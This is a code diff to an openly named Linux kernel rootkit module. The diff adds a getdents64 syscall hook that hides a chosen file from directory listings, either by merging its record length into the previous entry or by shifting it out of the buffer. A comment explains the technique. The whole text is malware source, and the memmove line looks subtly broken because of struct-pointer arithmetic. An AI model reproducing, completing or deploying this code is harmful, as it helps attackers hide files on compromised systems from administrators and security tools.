@@ -28,15 +28,6 @@ module_param(file_to_hide, charp, 0000);
 MODULE_PARM_DESC(file_to_hide, "file to hide from getdents64 syscall");
 
 
-// struct linux_dirent64 {
-//     u64         d_ino;
-//     s64         d_off;
-//     unsigned short      d_reclen;
-//     unsigned char       d_type;
-//     char        d_name[];
-// };
-
-
 
 int set_addr_rw(unsigned long _addr) {
 
@@ -95,12 +86,33 @@ static void __exit rootkit_exit(void) {
 }
 
 
+
+
+
+/*
+dirent struct for reference:
+// struct linux_dirent64 {
+//     u64         d_ino;
+//     s64         d_off;
+//     unsigned short      d_reclen;
+//     unsigned char       d_type;
+//     char        d_name[];
+// };
+
+iterates over the structs returned by the original getdents64.
+If it finds a file name file_to_hide (provided by commandline upon insertion),
+it hides it by adding the length of the struct to the length of the previous struct.
+when a userspace program iterates over the results of getdents64,
+it will do so by adding the d_reclen to the index every iteration.
+this will make it miss the hidden file, jumping over it.
+*/
 asmlinkage int new_getdents64(const struct pt_regs *regs)
 {
-	int loc;
-	struct linux_dirent64 *dirent_kern, *dirent, *curr_ent = NULL;
+	struct linux_dirent64 *dirent_kern, *dirent, *curr_ent, *prev_ent = NULL; 
 	unsigned int len;
+
 	unsigned long index = 0;
+
 	unsigned short reclen;
 	long error;
 
@@ -117,16 +129,35 @@ asmlinkage int new_getdents64(const struct pt_regs *regs)
 	
 	printk(KERN_INFO "%s\n",dirent_kern->d_name);
 
+	curr_ent = (void*)dirent_kern + index;
+	prev_ent = curr_ent;
+
 	while (index < len)
 	{
+		prev_ent = curr_ent;
 		curr_ent = (void*)dirent_kern + index;
+
 		//printk(KERN_INFO "what's this : %s\n",curr_ent->d_name);
 		if (strcmp(file_to_hide, curr_ent->d_name) == 0){
 			printk(KERN_INFO "found secret file: %s",file_to_hide);
+			if (index == 0 )// special case
+			{
+				len -= curr_ent->d_reclen;
+				memmove(curr_ent, curr_ent+curr_ent->d_reclen, len);
+			}
+			else
+			{
+				prev_ent->d_reclen += curr_ent->d_reclen;
+			}
 		}
 		//if (strcmp(dirent_kern))
 		index += curr_ent->d_reclen;
 	}
+
+	error = copy_to_user(dirent, dirent_kern, len);
+	if (error)
+		goto done;	
+
 	done:
 		kfree(dirent_kern);
 		return len;
